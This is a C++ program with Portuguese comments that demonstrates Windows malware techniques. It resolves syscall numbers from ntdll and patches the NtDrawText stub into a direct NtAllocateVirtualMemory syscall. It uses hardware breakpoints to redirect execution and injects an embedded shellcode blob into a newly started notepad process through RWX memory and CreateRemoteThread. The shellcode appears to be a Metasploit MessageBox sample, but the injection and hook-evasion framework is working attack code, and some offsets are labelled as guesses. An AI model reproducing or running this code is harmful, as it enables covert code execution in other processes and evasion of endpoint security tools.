#include <ntstatus.h>
#include <Windows.h>
#include <winternl.h> // Para PROCESS_BASIC_INFORMATION e funções internas do Windows
#include <ntstatus.h> // Para códigos de status
#include <iostream>

typedef NTSTATUS(NTAPI* _NtQueryInformationProcess)(
    HANDLE ProcessHandle,
    PROCESSINFOCLASS ProcessInformationClass,
    PVOID ProcessInformation,
    ULONG ProcessInformationLength,
    PULONG ReturnLength
    );

uint32_t ROR13Hash(const char* functionName) {
    uint32_t functionHash = 0;
    for (int i = 0; functionName[i] != '\0'; i++) {
        uint32_t c = (uint32_t)functionName[i];
        functionHash = (functionHash >> 13) | (functionHash << (32 - 13));
        functionHash += c;
    }
    return functionHash;
}

DWORD GetSSN(LPCSTR functionName) {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    uint32_t hash = ROR13Hash(functionName);
    FARPROC funcAddr = GetProcAddress(hNtdll, functionName);

    if (funcAddr == nullptr) {
        return 0;
    }

    // Exemplo de leitura do SSN. Pode ser necessário ajustar para o offset correto
    BYTE* pFunction = (BYTE*)funcAddr;
    DWORD ssn = *(DWORD*)(pFunction + 0x4); // Suposição de exemplo do offset

    return ssn;
}



bool ModifyFunctionToSyscall(DWORD ssn, FARPROC funcAddr) {
    BYTE* pFunction = reinterpret_cast<BYTE*>(funcAddr);
    DWORD oldProtect;

    if (VirtualProtect(pFunction, 10, PAGE_EXECUTE_READWRITE, &oldProtect)) {
        pFunction[0] = 0xB8;
        *reinterpret_cast<DWORD*>(&pFunction[1]) = ssn;
        pFunction[5] = 0x0F;
        pFunction[6] = 0x05;
        pFunction[7] = 0xC3;
        VirtualProtect(pFunction, 10, oldProtect, &oldProtect);
        return true;
    }
    return false;
}

void SetHardwareBreakpoint(FARPROC funcAddr, DWORD registerIndex) {
    CONTEXT ctx = {};
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;

    HANDLE hThread = GetCurrentThread();
    GetThreadContext(hThread, &ctx);

    // Definir o endereço do ponto de interrupção
    (&ctx.Dr0)[registerIndex] = (DWORD_PTR)funcAddr;

    // Configurar o ponto de interrupção para ser acionado na execução
    ctx.Dr7 |= (1 << (2 * registerIndex));

    SetThreadContext(hThread, &ctx);
}

void UpdateRAXandContinue(FARPROC funcAddr, DWORD newSSN) {
    CONTEXT ctx = {};
    ctx.ContextFlags = CONTEXT_CONTROL;

    HANDLE hThread = GetCurrentThread();
    GetThreadContext(hThread, &ctx);

    // Atualizar RAX com o novo SSN
    ctx.Rax = newSSN;

    // Atualizar o contador de programa (RIP) para continuar após o ponto de interrupção
    ctx.Rip = (DWORD_PTR)funcAddr + 0x8; // Presumindo que o ponto de interrupção está 8 bytes à frente

    SetThreadContext(hThread, &ctx);
}

bool VerifyModification(FARPROC funcAddr, DWORD expectedSSN) {
    BYTE* pFunction = reinterpret_cast<BYTE*>(funcAddr);
    DWORD ssn = *reinterpret_cast<DWORD*>(&pFunction[1]);
    return pFunction[0] == 0xB8 && ssn == expectedSSN;
}

DWORD GetCurrentSSN(FARPROC funcAddr) {
    BYTE* pFunction = reinterpret_cast<BYTE*>(funcAddr);
    return *reinterpret_cast<DWORD*>(&pFunction[1]);
}

int main() {


    DWORD ssnNtDelayExecution = GetSSN("NtDelayExecution");
    DWORD ssnNtSetInformationThread = GetSSN("NtSetInformationThread");
    DWORD ssnNtYieldExecution = GetSSN("NtYieldExecution");
    DWORD ssnNtAllocateVirtualMemory = GetSSN("NtAllocateVirtualMemory");
    DWORD ssnNtDrawText = GetSSN("NtDrawText");



    std::cout << "SSN de NtDelayExecution: " << ssnNtDelayExecution << std::endl;
    std::cout << "SSN de NtSetInformationThread: " << ssnNtSetInformationThread << std::endl;
    std::cout << "SSN de NtYieldExecution: " << ssnNtYieldExecution << std::endl;
    std::cout << "SSN de NtAllocateVirtualMemory: " << ssnNtAllocateVirtualMemory << std::endl;
    std::cout << "SSN de NtDrawText: " << ssnNtDrawText << std::endl;

    FARPROC addrNtDelayExecution = GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtDelayExecution");
    FARPROC addrNtSetInformationThread = GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtSetInformationThread");
    FARPROC addrNtYieldExecution = GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtYieldExecution");
    FARPROC addrNtAllocateVirtualMemory = GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtAllocateVirtualMemory");


    std::cout << "Endereço de NtDelayExecution: " << addrNtDelayExecution << std::endl;
    std::cout << "Endereço de NtSetInformationThread: " << addrNtSetInformationThread << std::endl;
    std::cout << "Endereço de NtYieldExecution: " << addrNtYieldExecution << std::endl;
    std::cout << "Endereço de NtAllocateVirtualMemory: " << addrNtAllocateVirtualMemory << std::endl;

    DWORD ssnNtQueryInformationProcess = GetSSN("NtQueryInformationProcess");
    std::cout << "SSN de NtQueryInformationProcess: " << ssnNtQueryInformationProcess << std::endl;

    FARPROC addrNtQueryInformationProcess = GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQueryInformationProcess");
    std::cout << "Endereço de NtQueryInformationProcess: " << addrNtQueryInformationProcess << std::endl;


    FARPROC addrNtDrawText = GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtDrawText");
    std::cout << "Endereço de NtDrawText: " << addrNtDrawText << std::endl;

    if (addrNtDrawText != nullptr) {
        if (ModifyFunctionToSyscall(ssnNtAllocateVirtualMemory, addrNtDrawText) &&
            VerifyModification(addrNtDrawText, ssnNtAllocateVirtualMemory)) {
            std::cout << "NtDrawText foi modificada para usar SSN de NtAllocateVirtualMemory com sucesso!" << std::endl;

            // Exibir o SSN atual após a modificação
            DWORD currentSSN = GetCurrentSSN(addrNtDrawText);
            std::cout << "O novo SSN de NtDrawText é: " << currentSSN << std::endl;
        }
        else {
            std::cout << "Falha ao modificar NtDrawText para usar SSN de NtAllocateVirtualMemory" << std::endl;
        }
    }

    _NtQueryInformationProcess MyNtQueryInformationProcess =
        (_NtQueryInformationProcess)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQueryInformationProcess");

    PROCESS_BASIC_INFORMATION pbi;
    ULONG returnLength;

    typedef NTSTATUS(NTAPI* _NtCreateProcess)(
        PHANDLE ProcessHandle,
        ACCESS_MASK DesiredAccess,
        POBJECT_ATTRIBUTES ObjectAttributes,
        HANDLE ParentProcess,
        BOOLEAN InheritObjectTable,
        HANDLE SectionHandle,
        HANDLE DebugPort,
        HANDLE ExceptionPort
        );

    typedef NTSTATUS(NTAPI* _NtQueryInformationProcess)(
        HANDLE ProcessHandle,
        PROCESSINFOCLASS ProcessInformationClass,
        PVOID ProcessInformation,
        ULONG ProcessInformationLength,
        PULONG ReturnLength
        );


    NTSTATUS status = MyNtQueryInformationProcess(
        GetCurrentProcess(),
        ProcessBasicInformation,
        &pbi,
        sizeof(pbi),
        &returnLength
    );

    if (status != STATUS_SUCCESS) {
        std::cerr << "Falha ao obter informações do processo." << std::endl;
        return 1;
    }

    // Exibindo informações do PEB
    std::cout << "Base do PEB: " << pbi.PebBaseAddress << std::endl;
    std::cout << "PID do Processo: " << pbi.UniqueProcessId << std::endl;
    // O campo InheritedFromUniqueProcessId não está disponível na estrutura oficial

    const char shellcode[] = "\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xd0\x00\x00\x00\x41\x51"
"\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x3e\x48"
"\x8b\x52\x18\x3e\x48\x8b\x52\x20\x3e\x48\x8b\x72\x50\x3e\x48"
"\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02"
"\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x3e"
"\x48\x8b\x52\x20\x3e\x8b\x42\x3c\x48\x01\xd0\x3e\x8b\x80\x88"
"\x00\x00\x00\x48\x85\xc0\x74\x6f\x48\x01\xd0\x50\x3e\x8b\x48"
"\x18\x3e\x44\x8b\x40\x20\x49\x01\xd0\xe3\x5c\x48\xff\xc9\x3e"
"\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41"
"\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x3e\x4c\x03\x4c\x24"
"\x08\x45\x39\xd1\x75\xd6\x58\x3e\x44\x8b\x40\x24\x49\x01\xd0"
"\x66\x3e\x41\x8b\x0c\x48\x3e\x44\x8b\x40\x1c\x49\x01\xd0\x3e"
"\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41"
"\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41"
"\x59\x5a\x3e\x48\x8b\x12\xe9\x49\xff\xff\xff\x5d\x49\xc7\xc1"
"\x00\x00\x00\x00\x3e\x48\x8d\x95\xfe\x00\x00\x00\x3e\x4c\x8d"
"\x85\x0b\x01\x00\x00\x48\x31\xc9\x41\xba\x45\x83\x56\x07\xff"
"\xd5\x48\x31\xc9\x41\xba\xf0\xb5\xa2\x56\xff\xd5\x4d\x53\x46"
"\x55\x20\x45\x78\x61\x6d\x70\x6c\x65\x00\x4d\x65\x73\x73\x61"
"\x67\x65\x42\x6f\x78\x00";




    // Criar um processo
    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));

    if (!CreateProcess(L"C:\\Windows\\System32\\notepad.exe", 
        NULL,    // Comando
        NULL,    // Atributos de segurança do processo
        NULL,    // Atributos de segurança da thread
        FALSE,   // Herança de handles
        CREATE_NEW_CONSOLE, // Flags de criação
        NULL,    // Ambiente
        NULL,    // Diretório atual
        &si,     // Informações de inicialização
        &pi))    // Informações do processo
    {
        std::cerr << "Falha na criação do processo: " << GetLastError() << std::endl;
        return 1;
    }

    typedef NTSTATUS(NTAPI* pfnNtAllocateVirtualMemory)(
        HANDLE ProcessHandle,
        PVOID* BaseAddress,
        ULONG_PTR ZeroBits,
        PSIZE_T RegionSize,
        ULONG AllocationType,
        ULONG Protect
        );

    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    pfnNtAllocateVirtualMemory NtAllocateVirtualMemory = (pfnNtAllocateVirtualMemory)GetProcAddress(hNtdll, "NtAllocateVirtualMemory");


    // Obter um handle do processo
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pi.dwProcessId);
    if (hProcess == NULL) {
        std::cerr << "Falha ao abrir o processo: " << GetLastError() << std::endl;
        return 1;
    }

    // Alocar memória no processo alvo
    PVOID remoteMemory = nullptr;
    SIZE_T shellcodeSize = sizeof(shellcode);
    NTSTATUS allocStatus = NtAllocateVirtualMemory(hProcess, &remoteMemory, 0, &shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    if (allocStatus != STATUS_SUCCESS) {
        std::cerr << "Falha na alocação de memória: " << allocStatus << std::endl;
        CloseHandle(hProcess); // Fechar handle se falhar
        return 1;
    }

    // Escrever shellcode na memória alocada
    SIZE_T written;
    if (!WriteProcessMemory(hProcess, remoteMemory, shellcode, shellcodeSize, &written)) {
        std::cerr << "Falha ao escrever shellcode: " << GetLastError() << std::endl;
        return 1;
    }

    // Criar uma thread remota para executar o shellcode
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)remoteMemory, NULL, 0, NULL);
    if (hThread == NULL) {
        std::cerr << "Falha na criação da thread remota: " << GetLastError() << std::endl;
        CloseHandle(hProcess); // Fechar handle se falhar
        return 1;
    }

    WaitForSingleObject(hThread, INFINITE);
    CloseHandle(hProcess);
    CloseHandle(hThread);

    if (addrNtDrawText != nullptr) {
        if (ModifyFunctionToSyscall(ssnNtAllocateVirtualMemory, addrNtDrawText) &&
            VerifyModification(addrNtDrawText, ssnNtAllocateVirtualMemory)) {
            // Exibir o SSN atual após a modificação
            DWORD currentSSN = GetCurrentSSN(addrNtDrawText);
            std::cout << "O novo SSN de NtDrawText é: " << currentSSN << std::endl;
            std::cout << "NtDrawText foi modificada para usar SSN de NtAllocateVirtualMemory com sucesso!" << std::endl;
            SetHardwareBreakpoint(addrNtDrawText, 0); // Utilizando Dr0 para o ponto de interrupção
            typedef void (*FuncType)();
            FuncType callNtDrawText = (FuncType)addrNtDrawText;
            callNtDrawText();

            // Atualizar RAX e continuar a execução após o ponto de interrupção
            UpdateRAXandContinue(addrNtDrawText, ssnNtAllocateVirtualMemory);

        }
        else {
            std::cout << "Falha ao modificar NtDrawText." << std::endl;
        }
    }
    return 0;
}
